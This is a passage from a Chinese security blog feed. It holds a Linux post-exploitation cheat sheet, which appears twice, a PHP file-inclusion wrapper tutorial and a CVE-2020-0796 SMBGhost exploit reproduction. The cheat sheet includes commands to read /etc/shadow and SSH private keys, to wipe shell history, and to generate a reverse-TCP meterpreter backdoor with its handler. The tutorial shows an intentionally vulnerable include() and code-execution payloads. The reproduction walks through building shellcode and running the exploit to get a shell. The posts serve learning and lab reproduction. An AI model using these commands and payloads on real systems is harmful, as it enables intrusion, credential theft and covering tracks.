class="line">&#x2F;root&#x2F;.mysql_history &#x2F;&#x2F;mysql历史命令记录文件</span><br><span class="line">&#x2F;proc&#x2F;mounts &#x2F;&#x2F;记录系统挂载设备</span><br><span class="line">&#x2F;porc&#x2F;config.gz &#x2F;&#x2F;内核配置文件</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db &#x2F;&#x2F;全文件路径</span><br><span class="line">&#x2F;porc&#x2F;self&#x2F;cmdline &#x2F;&#x2F;当前进程的cmdline参数</span><br></pre></td></tr></table></figure><h4 id="内核版本"><a href="#内核版本" class="headerlink" title="内核版本"></a>内核版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname –a 查看所有信息</span><br></pre></td></tr></table></figure><h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">id</span><br><span class="line">cat &#x2F;etc&#x2F;passwd #查看用户列表</span><br><span class="line">cat &#x2F;etc&#x2F;shadow #获取用户hash</span><br></pre></td></tr></table></figure><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux 查看进程信息</span><br></pre></td></tr></table></figure><h4 id="网卡"><a href="#网卡" class="headerlink" title="网卡"></a>网卡</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;network&#x2F;interfaces #网卡信息</span><br><span class="line">ifconfig</span><br><span class="line">route #查看路由</span><br><span class="line">arp -a #查看缓存的地址解析情况</span><br></pre></td></tr></table></figure><h4 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;serivice #查看存在的服务</span><br><span class="line">cat &#x2F;etc&#x2F;serices | grep ** #查看对应服务</span><br></pre></td></tr></table></figure><h4 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line">cat &#x2F;etc&#x2F;my.conf</span><br><span class="line">cat &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br></pre></td></tr></table></figure><h4 id="日志信息"><a href="#日志信息" class="headerlink" title="日志信息"></a>日志信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log #http日志</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysql&#x2F;error.log #mysql日志</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apt&#x2F;history.log #apt日志</span><br></pre></td></tr></table></figure><h4 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> ~&#x2F;.bash_history</span><br><span class="line">echo &gt; .bash_history #上述文件类日志删除</span><br><span class="line">history #命令操作历史</span><br><span class="line">history -c #删除</span><br></pre></td></tr></table></figure><h4 id="软件信息"><a href="#软件信息" class="headerlink" title="软件信息"></a>软件信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l #查看安装的软件包</span><br><span class="line">rpm -qa #查看安装的软件包</span><br></pre></td></tr></table></figure><h1 id="关键信息收集"><a href="#关键信息收集" class="headerlink" title="关键信息收集"></a>关键信息收集</h1><p>历史命令！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;.bash_history</span><br></pre></td></tr></table></figure><p>本地保存的ssh密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa</span><br></pre></td></tr></table></figure><h3 id="LINUX后门生成"><a href="#LINUX后门生成" class="headerlink" title="LINUX后门生成"></a>LINUX后门生成</h3><p>1.示例指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.73.131 LPORT&#x3D;4444 -f elf &gt; root&#x2F;Desktop&#x2F;shell</span><br></pre></td></tr></table></figure><p>2.配置<code>Metasploit</code>，<code>exploit</code>监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search exploit&#x2F;hanler  &#x2F;&#x2F; (exploit&#x2F;multi&#x2F;handler：通用有效负载处理程序)</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler        &#x2F;&#x2F; 使用模块</span><br><span class="line">show options         &#x2F;&#x2F; 配置</span><br><span class="line">set LHOST 192.168.73.131</span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp         &#x2F;&#x2F; 设置测试的载荷</span><br><span class="line">exploit            &#x2F;&#x2F; 监听</span><br></pre></td></tr></table></figure><p>nmap扫描：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap ‐sP ‐PI 192.168.1.0&#x2F;24 ‐T4</span><br></pre></td></tr></table></figure><p>端口扫描</p><p>auxiliary/scanner/portscan<br>scanner/portscan/ack ACK防火墙扫描<br>scanner/portscan/ftpbounce FTP跳端口扫描<br>scanner/portscan/syn SYN端口扫描<br>scanner/portscan/tcp TCP端口扫描<br>scanner/portscan/xmas TCP”XMas”端口扫描</p><p>SMB扫描</p><p><strong>scanner下模块，辅助发现内网存活主机，分别为：</strong></p><ul><li><p>auxiliary/scanner/discovery/arp_sweep</p></li><li><p>auxiliary/scanner/discovery/udp_sweep</p></li><li><p>auxiliary/scanner/ftp/ftp_version</p></li><li><p>auxiliary/scanner/http/http_version</p></li><li><p>auxiliary/scanner/smb/smb_version</p></li><li><p>auxiliary/scanner/ssh/ssh_version</p></li><li><p>auxiliary/scanner/telnet/telnet_version</p></li><li><p>auxiliary/scanner/discovery/udp_probe</p></li><li><p>auxiliary/scanner/dns/dns_amp</p></li><li><p>auxiliary/scanner/mysql/mysql_version</p></li><li><p>auxiliary/scanner/netbios/nbname</p></li><li><p>auxiliary/scanner/http/title</p></li><li><p>auxiliary/scanner/db2/db2_version</p></li><li><p>auxiliary/scanner/portscan/ack</p></li><li><p>auxiliary/scanner/portscan/tcp</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux 运维 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 内网本机信息收集速查</title>
      <link href="/2020/06/23/Linux%20%E5%86%85%E7%BD%91%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%80%9F%E6%9F%A5/"/>
      <url>/2020/06/23/Linux%20%E5%86%85%E7%BD%91%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%80%9F%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>Linux 内网本机信息收集速查</p><h4 id="系统类型"><a href="#系统类型" class="headerlink" title="系统类型"></a>系统类型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">查看系统名称</span><br></pre></td></tr></table></figure><h4 id="内核版本"><a href="#内核版本" class="headerlink" title="内核版本"></a>内核版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname –a 查看所有信息</span><br></pre></td></tr></table></figure><h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">id</span><br><span class="line">cat &#x2F;etc&#x2F;passwd #查看用户列表</span><br><span class="line">cat &#x2F;etc&#x2F;shadow #获取用户hash</span><br></pre></td></tr></table></figure><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux 查看进程信息</span><br></pre></td></tr></table></figure><h4 id="网卡"><a href="#网卡" class="headerlink" title="网卡"></a>网卡</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;network&#x2F;interfaces #网卡信息</span><br><span class="line">ifconfig</span><br><span class="line">route #查看路由</span><br><span class="line">arp -a #查看缓存的地址解析情况</span><br></pre></td></tr></table></figure><h4 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;serivice #查看存在的服务</span><br><span class="line">cat &#x2F;etc&#x2F;serices | grep ** #查看对应服务</span><br></pre></td></tr></table></figure><h4 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line">cat &#x2F;etc&#x2F;my.conf</span><br><span class="line">cat &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br></pre></td></tr></table></figure><h4 id="日志信息"><a href="#日志信息" class="headerlink" title="日志信息"></a>日志信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log #http日志</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysql&#x2F;error.log #mysql日志</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apt&#x2F;history.log #apt日志</span><br></pre></td></tr></table></figure><h4 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> ~&#x2F;.bash_history</span><br><span class="line">echo &gt; .bash_history #上述文件类日志删除</span><br><span class="line">history #命令操作历史</span><br><span class="line">history -c #删除</span><br></pre></td></tr></table></figure><h4 id="软件信息"><a href="#软件信息" class="headerlink" title="软件信息"></a>软件信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l #查看安装的软件包</span><br><span class="line">rpm -qa #查看安装的软件包</span><br></pre></td></tr></table></figure><h1 id="关键信息收集"><a href="#关键信息收集" class="headerlink" title="关键信息收集"></a>关键信息收集</h1><p>历史命令！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;.bash_history</span><br></pre></td></tr></table></figure><p>本地保存的ssh密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa</span><br></pre></td></tr></table></figure><h3 id="LINUX后门生成"><a href="#LINUX后门生成" class="headerlink" title="LINUX后门生成"></a>LINUX后门生成</h3><p>1.示例指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.73.131 LPORT&#x3D;4444 -f elf &gt; root&#x2F;Desktop&#x2F;shell</span><br></pre></td></tr></table></figure><p>2.配置<code>Metasploit</code>，<code>exploit</code>监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search exploit&#x2F;hanler  &#x2F;&#x2F; (exploit&#x2F;multi&#x2F;handler：通用有效负载处理程序)</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler        &#x2F;&#x2F; 使用模块</span><br><span class="line">show options         &#x2F;&#x2F; 配置</span><br><span class="line">set LHOST 192.168.73.131</span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp         &#x2F;&#x2F; 设置测试的载荷</span><br><span class="line">exploit            &#x2F;&#x2F; 监听</span><br></pre></td></tr></table></figure><p>nmap扫描：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap ‐sP ‐PI 192.168.1.0&#x2F;24 ‐T4</span><br></pre></td></tr></table></figure><p>端口扫描</p><p>auxiliary/scanner/portscan<br>scanner/portscan/ack ACK防火墙扫描<br>scanner/portscan/ftpbounce FTP跳端口扫描<br>scanner/portscan/syn SYN端口扫描<br>scanner/portscan/tcp TCP端口扫描<br>scanner/portscan/xmas TCP”XMas”端口扫描</p><p>SMB扫描</p><p><strong>scanner下模块，辅助发现内网存活主机，分别为：</strong></p><ul><li><p>auxiliary/scanner/discovery/arp_sweep</p></li><li><p>auxiliary/scanner/discovery/udp_sweep</p></li><li><p>auxiliary/scanner/ftp/ftp_version</p></li><li><p>auxiliary/scanner/http/http_version</p></li><li><p>auxiliary/scanner/smb/smb_version</p></li><li><p>auxiliary/scanner/ssh/ssh_version</p></li><li><p>auxiliary/scanner/telnet/telnet_version</p></li><li><p>auxiliary/scanner/discovery/udp_probe</p></li><li><p>auxiliary/scanner/dns/dns_amp</p></li><li><p>auxiliary/scanner/mysql/mysql_version</p></li><li><p>auxiliary/scanner/netbios/nbname</p></li><li><p>auxiliary/scanner/http/title</p></li><li><p>auxiliary/scanner/db2/db2_version</p></li><li><p>auxiliary/scanner/portscan/ack</p></li><li><p>auxiliary/scanner/portscan/tcp</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议 配合 文件包含漏洞.md</title>
      <link href="/2020/06/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%20%E9%85%8D%E5%90%88%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.md/"/>
      <url>/2020/06/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%20%E9%85%8D%E5%90%88%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.md/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h1><p>被问到了php的一伪协议</p><p>后发现自己对伪协议的认识还是太浅， 现在好好总结学习一番</p><p>又感觉自己学了半天不知道自己在干嘛。。。哎。。。</p><h1 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h1><p>PHP版本：5.4.45</p><p>PHP.ini：</p><p>allow_url_fopen ：on 默认开启</p><p>allow_url_include：om 默认关闭</p><p>PHP版本&lt;=5.2 可以使用%00进行截断，但是少有低版本的了。。。</p><p>先站在前人的大肩膀看看总结 ，主要是两个选项的开关，实验我默认都开了</p><p>freebuff上看到的</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTEyMjEyMjMucG5n?x-oss-process=image/format,png" alt="img"></p><h1 id="0x02-具体的协议"><a href="#0x02-具体的协议" class="headerlink" title="0x02 具体的协议"></a>0x02 具体的协议</h1><p>我的实验代码cmd.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&#39;file&#39;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="php-访问输入输出流"><a href="#php-访问输入输出流" class="headerlink" title="php:// 访问输入输出流"></a>php:// 访问输入输出流</h2><p>其中主要有两个协议：</p><h3 id="php-filter-简介"><a href="#php-filter-简介" class="headerlink" title="php://filter 简介"></a>php://filter 简介</h3><p>PHP 过滤器用于对来自非安全来源的数据（比如用户输入）进行验证和过滤。</p><p>在文件包含中常用到这个协议（因为文件包含的特性，只有包含php标签就会解析，就算是PHP后缀但是里面没有PHP标签也不会解析）</p><p>所以如果想要读取运行php文件的源码，可以先base64编码，再传入include函数，这样就不会被认为是php文件，不会执行，会输出文件的base64编码，再解码即可。</p><p>常用payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;cmd.php</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTEyMzQ5MjIucG5n?x-oss-process=image/format,png" alt="image-20200611234922747"></p><p>解码即可</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTEyMzQ5NDgucG5n?x-oss-process=image/format,png" alt="image-20200611234948231"></p><h3 id="php-input-协议"><a href="#php-input-协议" class="headerlink" title="php://input 协议"></a>php://input 协议</h3><p>这个协议的利用方法是 :</p><p>将要执行的语法php代码写在post中提交，只写代码即可。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTIwMDA0MjEucG5n?x-oss-process=image/format,png" alt="image-20200612000421438"></p><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a>file:// 协议</h2><p>file:// 用于访问本地文件系统，</p><p>不受allow_url_fopen与allow_url_include的影响</p><p>注意需要绝对路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;文件的绝对路径和文件名</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTEyMzU3NTgucG5n?x-oss-process=image/format,png" alt="image-20200611235758574"></p><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><p>data://协议需要满足双on条件</p><p><strong>PHP.ini：</strong></p><p>data://协议必须双在on才能正常使用；</p><p>allow_url_fopen ：on</p><p>allow_url_include：on</p><p>利用payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmd.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">cmd.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br><span class="line">cmd.php?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">cmd.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTIwMDAxMDkucG5n?x-oss-process=image/format,png" alt="image-20200612000109840"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTIwMDA1MjMucG5n?x-oss-process=image/format,png" alt="image-20200612000523051"></p><h2 id="zip-压缩协议"><a href="#zip-压缩协议" class="headerlink" title="zip://压缩协议"></a>zip://压缩协议</h2><p>条件：</p><p>需要绝对路径</p><p>allow_url_fopen ：off/on 任意</p><p>allow_url_include：off/on 任意</p><p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件</p><p>要点：不需要指定后缀名也可以利用</p><p>我只实验了zip协议</p><p>利用的时候：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;zip:&#x2F;&#x2F;绝对路径#压缩文件内的子文件名</span><br></pre></td></tr></table></figure><p>只能传入绝对路径。</p><p>要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;cmd.php?file&#x3D;zip:&#x2F;&#x2F;&#x2F;Applications&#x2F;MAMP&#x2F;htdocs&#x2F;xieyi.zip%23sd.php</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MTIwMDE0MjIucG5n?x-oss-process=image/format,png" alt="image-20200612001422357"></p><h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>留下了菜的泪水，发现学的有点杂，但是有些东西学的不到位吧。<br>纯自学有时候有点迷啊，学的乱七八糟的。<br>还有几个协议没写完，先把常用的写了，后续补上</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0796_RCE漏洞exp复现</title>
      <link href="/2020/06/05/CVE-2020-0796_RCE%E6%BC%8F%E6%B4%9Eexp%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/06/05/CVE-2020-0796_RCE%E6%BC%8F%E6%B4%9Eexp%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00漏洞介绍"><a href="#0x00漏洞介绍" class="headerlink" title="0x00漏洞介绍"></a>0x00漏洞介绍</h1><p>漏洞介绍</p><p>微软SMBv3 Client/Server远程代码执行漏洞CVE-2020-0796</p><p>影响范围：<br>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows Server, Version 1903 (Server Core installation)<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows Server, Version 1909 (Server Core installation)</p><h1 id="0x01复现坑点：坑点比较多看一下"><a href="#0x01复现坑点：坑点比较多看一下" class="headerlink" title="0x01复现坑点：坑点比较多看一下"></a>0x01复现坑点：坑点比较多看一下</h1><ul><li>Win10 版本有限制，具体我自己用的下面这个成功的</li></ul><p>ed2k://|file|cn_windows_10_business_editions_version_1903_updated_sept_2019_x64_dvd_2f5281e1.iso|5231140864|B1D5C4C401036B0B1EBA64476A95F338|/</p><ul><li>python 版本</li></ul><p>python 3.6 可以成功！</p><p>python 3.6 可以成功！</p><p>python 3.7 和 2 实测蓝屏</p><p>不懂为啥，有大佬知道可以指导一下弟弟</p><ul><li>payload要正向监听</li></ul><ul><li><p>补丁也有坑，KB4551762讲道理是没有，但是win10的补丁，看见就那几个，但是那个补丁里面可能有包含这个补丁</p></li><li><p>需要关闭defender防火墙 </p></li></ul><h1 id="0x02-复现过程"><a href="#0x02-复现过程" class="headerlink" title="0x02 复现过程"></a>0x02 复现过程</h1><p>首先使用systeminfo看一下补丁（KB4551762）</p><p>我新装的，肯定没啥问题，</p><ul><li>msf生成木马</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;4444 -b &#39;\x00&#39; -i 1 -f python</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTI5MTkucG5n?x-oss-process=image/format,png" alt="image-20200605112919799"></p><ul><li><p>EXP替换shellcode</p><p>把buf 替换成USER_PAYLOAD</p></li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTMwMzUucG5n?x-oss-process=image/format,png" alt="image-20200605113034988"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set lport 6666</span><br><span class="line">set rhost 192.168.31.235</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTQ5MTEucG5n?x-oss-process=image/format,png" alt="image-20200605114911778"></p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-jp0qeeXU-1591336663812)(/Users/zy/Library/Application%20Support/typora-user-images/image-20200605114841642.png)]</p><p>运行EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip 192.168.100.54</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMTE0MTIucG5n?x-oss-process=image/format,png" alt="image-20200605111412505"></p><p>最终拿到shell</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDUxMzM5NDUucG5n?x-oss-process=image/format,png" alt="image-20200605133945470"></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0796_RCE漏洞exp复现(非蓝屏)</title>
      <link href="/2020/06/05/CVE-2020-0796_RCE%E6%BC%8F%E6%B4%9Eexp%E5%A4%8D%E7%8E%B0(%E9%9D%9E%E8%93%9D%E5%B1%8F)/"/>
      <url>/2020/06/05/CVE-2020-0796_RCE%E6%BC%8F%E6%B4%9Eexp%E5%A4%8D%E7%8E%B0(%E9%9D%9E%E8%93%9D%E5%B1%8F)/</url>
      
